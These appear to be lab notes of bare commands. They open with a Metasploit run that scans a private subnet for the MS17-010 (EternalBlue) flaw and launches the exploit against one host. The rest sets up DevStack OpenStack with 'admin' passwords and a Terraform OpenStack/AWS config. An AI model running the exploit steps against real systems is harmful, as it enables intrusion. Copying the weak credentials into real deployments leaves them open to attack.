msfconsole
snap install metasploit-framework
search ms17-010
use 1
show options
set RHOSTS 192.168.57.0-255
set THREADS 10
run
 Khởi động Metasploit Framework và chạy câu lệnh “search ms17-010” 
use 2
show options
set RHOSTS 192.168.57.133
set LHOSTS 192.168.57.132
run
help

sudo apt update && sudo apt upgrade -y
sudo apt install git -y
git clone https://opendev.org/openstack/devstack.git
cd devstack
./stack.sh

nano local.conf
openstack service list

[[local|localrc]]
ADMIN_PASSWORD=admin
DATABASE_PASSWORD=admin
RABBIT_PASSWORD=admin
SERVICE_PASSWORD=admin
HOST_IP=192.168.1.100


http://your-ip/dashboard

openstack identity provider create --remote-id https://accounts.google.com \
  --domain default google

openstack federation mapping create --rules rules.json aws_mapping

provider "openstack" {
  auth_url    = "https://your-openstack-url:5000/v3"
  user_name   = "admin"
  password    = "your-password"
  tenant_name = "your-project"
}

provider "aws" {
  region = "us-west-1"
}

resource "openstack_compute_instance_v2" "vm1" {
  name            = "vm-openstack"
  image_name      = "Ubuntu 22.04"
  flavor_name     = "m1.medium"
}

resource "aws_instance" "vm2" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t2.micro"
}

terraform init
terraform apply -auto-approve

openstack service list
openstack network agent list

ping aws-instance-ip
